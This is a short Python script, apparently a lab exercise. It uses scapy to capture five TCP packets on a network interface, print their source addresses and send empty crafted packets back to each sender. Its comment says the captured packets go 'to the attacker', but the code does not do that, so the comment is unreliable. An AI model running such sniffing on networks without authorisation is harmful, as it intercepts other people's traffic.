#!/usr/bin/python3
# Python file for the packet sniffer
# Incorporates scapy to capture packets in the network and 
# send them to the attacker

from scapy.all import *
from copy import deepcopy

packets = []

def packet_sniffer():
    print('Calling packet sniffer function.')
    pkt = sniff(filter='tcp', count=5, iface='eth1', prn=packet_storage)

def packet_storage(packet):
    packets.append(packet)

def send_back():
    x = 50
    y = 5001
    for packet in packets:
        new_packet = IP()/TCP()
        new_packet[IP].dst = packet[IP].src
        new_packet[IP].src = packet[IP].dst

        new_packet[TCP].sport = y
        new_packet[TCP].dport = x

        x += 10
        y += 10

        print('new_packet:', new_packet.show())

        r1 = sr1(new_packet, timeout=2)
        

def print_packets():
    for packet in packets:
        print('Packet source IP:', packet[IP].src)
    

if __name__=='__main__':
    packet_sniffer()
    print_packets()
    send_back()
    
